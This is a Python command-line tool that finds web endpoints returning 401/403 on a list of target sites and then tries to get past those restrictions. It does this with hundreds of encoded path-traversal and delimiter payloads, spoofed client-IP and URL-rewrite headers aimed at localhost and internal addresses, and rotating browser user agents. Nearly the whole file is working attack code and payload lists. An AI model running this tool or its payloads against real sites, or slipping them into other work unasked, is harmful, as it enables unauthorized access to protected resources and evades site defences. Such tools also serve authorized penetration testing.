import argparse
import concurrent.futures
import random
import requests
from termcolor import colored as clr

# Idea of this tool is to try to bypass forbidden files, which are given by the user.
# The files given by the user should only be a couple of common forbidden files found on the target, which are then tried on all 200|404 pages.
# We will then take the first 401|403 result of the above scan, and place it to a list of forbidden endpoints i.e. format: list = [{"example.com":"/admin"}].
# After we've gathered all of the forbidden endpoints, we will start bypassing the file, using various techniques.

### BANNER
print("lol")

### PARSER
p = argparse.ArgumentParser()
p.add_argument(
        '-l',
        '--list',
        dest="list",
        required=True,
        help="Provide a list of urls to bypass."
        )
p.add_argument(
        '-w',
        '--wordlist',
        dest="wordlist",
        default=False,
        help="Provide a few words that are commonly forbidden in your target."
        )
p.add_argument(
        '-v',
        '-verbose',
        dest="verb",
        default=False,
        action="store_true",
        help="Make the tool verbose, printing out results once a scan completes."
        )
p.add_argument(
        '-o',
        '--output',
        dest="output",
        default="bypassed.txt",
        help="Give an output for the results."
        )
p.add_argument(
        '-c',
        '--concurrency',
        dest="conc",
        default=5,
        help="The concurrent scans."
        )
args = p.parse_args()

### USER AGENTS
user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246", "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/99.0.1150.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 12.6; rv:105.0) Gecko/20100101 Firefox/105.0", "Mozilla/5.0 (X11; Linux i686; rv:105.0) Gecko/20100101 Firefox/105.0", "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0", "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.34", "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.34", "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"]

### PAYLOADS
payloads_1 = ["#","#?","%","%09","%09%3b","%09..","%09;","%20","%20","%23","%23%3f","%252f%252f","%252f","%26","%2e","%2e%2e","%2e%2e%2f","%2e%2e","%2e","%2f","%2f%20%23","%2f%23","%2f%2f","%2f%3b%2f","%2f%3b%2f%2f","%2f%3f","%2f%3f","%2f","%3b","%3b%09","%3b%2f%2e%2e","%3b%2f%2e%2e%2f%2e%2e%2f%2f","%3b%2f%2e.","%3b%2f..","%3b/%2e%2e/..%2f%2f","%3b/%2e.","%3b/%2f%2f..","%3b/..","%3b//%2f..","%3f","%3f%23","%3f%3f","&",".%2e","..","..%00","..%00/;","..%00;","..%09" ,"..%0d" ,"..%0d/;" ,"..%0d;" ,"..%2f" ,"..%3B" ,"..%5c" ,"..%5c" ,"..%ff" ,"..%ff/;" ,"..%ff;" ,".." ,"../." ,"..;" ,"..;%00" ,"..;%0d" ,"..;%ff" ,"..;" ,"..;\;" ,"..;\\\\" ,"..\;" ,"..\\\\" ,"." ,"./." ,".//." ,".;" ,".\;" ,".html" ,".json" ,"%20#" ,"%20%20" ,"%20%23" ,"%252e%252e%252f" ,"%252e%252e%253b" ,"%252e%252f" ,"%252e%253b" ,"%252e" ,"%252f" ,"%2e%2e" ,"%2e%2e%3b" ,"%2e%2e" ,"%2e%2f" ,"%2e%3b" ,"%2e%3b/" ,"%2e" ,"%2e/" ,"%2f" ,"%3b" ,"*" ,"*" ,"." ,".." ,"..%2f" ,"..%2f..%2f" ,"..%2f..%2f..%2f" ,".." ,"../.." ,"../../.." ,"../../../" ,"../../" ,"../..//.." ,"../..;" ,".././.." ,"../.;/.." ,"../" ,"..//.." ,"..//../.." ,"..//..;" ,"../;" ,"../;/.." ,"..;%2f" ,"..;%2f..;%2f" ,"..;%2f..;%2f..;%2f" ,"..;" ,"..;/.." ,"..;/..;" ,"..;/" ,"..;//.." ,"..;//..;" ,"..;/;" ,"..;/;/..;" ,"." ,"./" ,".;" ,".;/" ,".randomstring" ,"/." ,"/.." ,"/../.." ,"/..;" ,"/." ,"/.;" ,"//.." ,"//.." ,"//../" ,"//..;" ,"//..;" ,"//..;/" ,"//" ,"/;" ,"/?anything" ,";" ,";/" ,";x" ,";x" ,"x/.." ,"x/../" ,"x/../;" ,"x/..;" ,"x/..;/" ,"x/..;/;" ,"x//.." ,"x//..;" ,"x/;/.." ,"x/;/..;" ,";" ,";%09" ,";%09.." ,";%09..;" ,";%09;" ,";%2f%2e%2e" ,";%2f%2e%2e%2f%2e%2e%2f%2f" ,";%2f%2f/.." ,";%2f.." ,";%2f..%2f%2e%2e%2f%2f" ,";%2f..%2f..%2f%2f" ,";%2f..%2f" ,";%2f..%2f/..%2f" ,";%2f..%2f/.." ,";%2f../%2f..%2f" ,";%2f../%2f.." ,";%2f..//..%2f" ,";%2f..//.." ,";%2f..//" ,";%2f..///;" ,";%2f..//;" ,";%2f..//;/;" ,";%2f../;/" ,";%2f../;/;" ,";%2f../;/;/;" ,";%2f..;//" ,";%2f..;//;" ,";%2f..;/;/" ,";%2f/%2f.." ,";%2f//..%2f" ,";%2f//.." ,";%2f//..;" ,";%2f/;/.." ,";%2f/;/..;" ,";%2f;//.." ,";%2f;/;/..;" ,";/%2e%2e" ,";/%2e%2e%2f%2f" ,";/%2e%2e%2f" ,";/%2e%2e" ,";/%2e." ,";/%2f%2f.." ,";/%2f/..%2f" ,";/%2f/.." ,";/.%2e" ,";/.%2e/%2e%2e/%2f" ,";/.." ,";/..%2f" ,";/..%2f%2f.." ,";/..%2f..%2f" ,";/..%2f" ,";/..%2f/" ,";/.." ,";/../%2f" ,";/../.." ,";/../../" ,";/.././.." ,";/../.;/.." ,";/../" ,";/..//%2e%2e" ,";/..//%2f" ,";/..//.." ,";/..//" ,";/../;" ,";/../;/.." ,";/..;" ,";/.;." ,";//%2f.." ,";//.." ,";//../.." ,";///.." ,";///.." ,";///../" ,";foo=bar" ,";x" ,";x" ,";x;" ,"?" ,"??" ,"???" ,"\..\.\\"]

payloads_2 = ["?" ,"??" ,"/" ,"//" ,"/." ,"/./" ,"/..;/" ,"..\;/" ,"..;/" ,"~" ,"°/" ,"#" ,"#/" ,"#/./" ,"#test" ,"%00" ,"%09" ,"%0A" ,"%0D" ,"%20" ,"%20/" ,"%25" ,"%23" ,"%26" ,"%3f" ,"%61" ,"&" ,"-" ,"." ,"..;" ,"..\;" ,"./" ,"/" ,"//" ,"0" ,"1" ,"?" ,"??" ,"???" ,"?WSDL" ,"?debug=1" ,"?debug=true" ,"?param" ,"?testparam" ,"\/\/" ,"debug" ,"false" ,"null" ,"true" ,"~"]

payloads_3 = ["Access-Control-Allow-Origin" ,"Base-Url" ,"CF-Connecting_IP" ,"CF-Connecting-IP" ,"Client-IP" ,"Cluster-Client-IP" ,"Destination" ,"Forwarded-For-Ip" ,"Forwarded-For" ,"Forwarded-Host" ,"Forwarded" ,"Host" ,"Http-Url" ,"Http-Host" ,"Origin" ,"Profile" ,"Proxy-Host" ,"Proxy-Url" ,"Proxy" ,"Real-Ip" ,"Redirect" ,"Referer" ,"Referrer" ,"Request-Uri" ,"True-Client-IP" ,"Uri" ,"Url" ,"X-Arbitrary" ,"X-Client-IP" ,"X-Custom-IP-Authorization" ,"X-Forward-For" ,"X-Forward" ,"X-Forwarded-By" ,"X-Forwarded-For-Original" ,"X-Forwarded-For" ,"X-Forwarded-Host" ,"X-Forwarded-Proto" ,"X-Forwarded-Server" ,"X-Forwarded" ,"X-Forwarder-For" ,"X-Host" ,"X-HTTP-DestinationURL" ,"X-HTTP-Host-Override" ,"X-Original-Remote-Addr" ,"X-Original-URL" ,"X-Original-Host" ,"X-Originally-Forwarded-For" ,"X-Originating-IP" ,"X-Proxy-Url" ,"X-ProxyUser-Ip" ,"X-Real-Ip" ,"X-Real-IP" ,"X-Referrer" ,"X-Remote-Addr" ,"X-Remote-IP" ,"X-Rewrite-URL" ,"X-Request-URL" ,"X-True-IP" ,"X-WAP-Profile"]

payloads_4 = ["X-Original-URL","X-Rewrite-URL","X-Request-URL","X-HTTP-DestinationURL","Forwarded","X-Forwarded","Base-Url","Http-Url","Destination"]

### SUB FUNCTIONS
def listfromfile(file):
    f = file
    with open(f) as l:
        createlist = [line.rstrip() for line in l]

    return createlist

def uagen():
    ua = f"{user_agents[random.randint(0,len(user_agents)-1)]}"
    return ua

def create_header(key,value,mode=1):
    if mode == 1:
        header = {
                'User-Agent':f"{uagen()}",
                'Accept-Encoding':'gzip, deflate, br',
                'Accept':'*/*',
                'Accept-Language':'en-US,en;q=0.5',
                }
    else:
        header = {
                'User-Agent':f"{uagen()}",
                'Accept-Encoding':'gzip, deflate, br',
                'Accept':'*/*',
                'Accept-Language':'en-US,en;q=0.5',
                f'{key}':f'{value}'
                }
    return header

### GLOBAL VARIABLES
urls = listfromfile(args.list)
words = listfromfile(args.wordlist)

### MAIN FUNCTIONS
# Initial probe on the list of urls to make sure that the endpoints are not 401|403.
def probe(url_list):
    viable = []
    viable_status_codes = [200,201,202,204,301,302,307,308,400,404]
    for u in url_list:
        # Making sure the "/" is at the end of the url
        if "/" != u[-1]:
            u += "/"
        try:
            r = requests.get(u, headers=create_header("don't","need"), allow_redirects=False, timeout=(5,5))
            r.close()
        except Exception as e:
            print("[",clr("ERR!","red"),"]",u,e)
        else:
            if r.status_code in viable_status_codes:
                print("[",clr(r.status_code,"green"),"]",u)
                if u not in viable:
                    viable.append(u)
            else:
                print("[",clr(r.status_code,"red"),"]",u)

    return viable

# This function is used to get the first forbidden result from the wordlist, and return the url and word in format: {"url":"word"}
def find_forbidden(url,wordlist):
    res = {url:None}
    forbidden_codes = [401,403]
    
    for w in wordlist:
        tar = f"{url}{w}"
        try:
            r = requests.get(tar, headers=create_header("don't","need"), allow_redirects=False, timeout=(5,5))
            r.close()
        except Exception as e:
            print("[",clr("ERR!","red"),"]",url,e)
        else:
            # If the word is forbidden, then place it as a value of "res", return it and break the loop and function
            if r.status_code in forbidden_codes:
                print("[",clr(r.status_code,"red"),"]",tar)
                res[url] = w
                return res

# This function will to the bypassing.
# It takes in an url, and the endpoint, which returned 403.
def bypassing(forbidden_object):
    # Getting the object items and placing them on variables
    for key,val in forbidden_object.items():
        url = key
        endpoint = val

    ok = [200,201,202,204,404]
    redir = [301,302,307,308]
    # Type 1 payloads: payload in between the url and the endpoint
    for p in payloads_1:
        tar = f"{url}{p}/{endpoint}"
        try:
            r = requests.get(tar, headers=create_header("dont","need"), allow_redirects=False, timeout=(5,5))
            r.close()
        except Exception as e:
            print("[",clr("ERR!","red"),"]",tar,e)
        else:
            if r.status_code in ok:
                with open(args.output,"a+") as file:
                    print("[",clr(r.status_code,"green"),"]",tar)
                    file.write(f"Status: {r.status_code}, Length: {len(r.content)}, Payload[1]: {tar}\n")
            elif r.status_code in redir:
                with open(args.output,"a+") as file:
                    print("[",clr(r.status_code,"yellow"),"]",tar)
                    file.write(f"Status: {r.status_code}, Length: {len(r.content)}, Payload[1]: {tar}, Redirect: {r.headers['Location']}\n")
            else:
                print("[",clr(r.status_code,"red"),"]",tar)

    # Type 2 payloads: payload after the endpoint
    for p in payloads_2:
        tar = f"{url}{endpoint}{p}"
        try:
            r = requests.get(tar, headers=create_header("dont","need"), allow_redirects=False, timeout=(5,5))
            r.close()
        except Exception as e:
            print("[",clr("ERR!","red"),"]",tar,e)
        else:
            if r.status_code in ok:
                with open(args.output,"a+") as file:
                    print("[",clr(r.status_code,"green"),"]",tar)
                    file.write(f"Status: {r.status_code}, Length: {len(r.content)}, Payload[2]: {tar}\n")
            elif r.status_code in redir:
                with open(args.output,"a+") as file:
                    print("[",clr(r.status_code,"yellow"),"]",tar)
                    file.write(f"Status: {r.status_code}, Length: {len(r.content)}, Payload[2]: {tar}, Redirect: {r.headers['Location']}\n")
            else:
                print("[",clr(r.status_code,"red"),"]",tar)

    # Type 3 payloads: using custom headers to bypass
    for p in payloads_3:
        tar = f"{url}{endpoint}"
        ips = ["*","0","0.0.0.0","0177.0000.0000.0001","0177.1","0x7F000001","10.0.0.0","10.0.0.1","127.0.0.1","127.0.0.1:443","127.0.0.1:80","127.1","172.16.0.0","172.16.0.1","172.17.0.1","192.168.0.2","192.168.1.0","192.168.1.1","2130706433","8.8.8.8","localhost","localhost:443","localhost:80","norealhost","null"]
        for val in ips:
            try:
                r = requests.get(tar, headers=create_header(p,val,mode=2), allow_redirects=False, timeout=(5,5))
                r.close()
            except Exception as e:
                print("[",clr("ERR!","red"),"]",tar,e)
            else:
                if r.status_code in ok:
                    with open(args.output,"a+") as file:
                        print("[",clr(r.status_code,"green"),"]",tar)
                        file.write(f"Status: {r.status_code}, Length: {len(r.content)}, Payload[3]: {tar}   {p}:{val}\n")
                elif r.status_code in redir:
                    with open(args.output,"a+") as file:
                        print("[",clr(r.status_code,"yellow"),"]",tar)
                        file.write(f"Status: {r.status_code}, Length: {len(r.content)}, Payload[3]: {tar}   {p}:{val}, Redirect: {r.headers['Location']}\n")
                else:
                    print("[",clr(r.status_code,"red"),"]",tar)

    # Type 4 payloads: using X-Original-URL and X-Rewrite-URL: /forbidden to bypass the file
    for p in payloads_4:
        tar = f"{url}"
        try:
            r = requests.get(tar, headers=create_header(p,endpoint,mode=2), allow_redirects=False, timeout=(5,5))
            r.close()
        except Exception as e:
            print("[",clr("ERR!","red"),"]",tar,e)
        else:
            if r.status_code in ok:
                with open(args.output,"a+") as file:
                    print("[",clr(r.status_code,"green"),"]",tar)
                    file.write(f"Status: {r.status_code}, Length: {len(r.content)}, Payload[4]: {tar}   {p}:{endpoint}\n")
            elif r.status_code in redir:
                with open(args.output,"a+") as file:
                    print("[",clr(r.status_code,"yellow"),"]",tar)
                    file.write(f"Status: {r.status_code}, Length: {len(r.content)}, Payload[4]: {tar}   {p}:{endpoint}, Redirect: {r.headers['Location']}\n")
            else:
                print("[",clr(r.status_code,"red"),"]",tar)

    # Type 5 payloads: using different verbs to bypass the file
    # WiP

### SCRIPT
if __name__ == "__main__":
    # Get viable urls
    print("[",clr("INFO","light_grey"),"]","Probing the list of urls")
    viable = probe(urls)

    # List of forbidden objects
    print("\n[",clr("INFO","light_grey"),"]","Looking for forbidden files")
    forbidden = []
    # Multiprocessing the urls for forbidden files.
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.conc) as exe:
        f1 = [exe.submit(find_forbidden,viable[x],words) for x in range(len(viable))] 
        for r in concurrent.futures.as_completed(f1):
            forbidden.append(r.result())

    # Bypassing endpoints
    print("\n[",clr("INFO","light_grey"),"]","Bypassing endpoints")
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.conc) as exe:
        f1 = [exe.submit(bypassing,forbidden[x]) for x in range(len(forbidden))] 

    print("\n[",clr("COMPLETE","light_yellow"),"]")
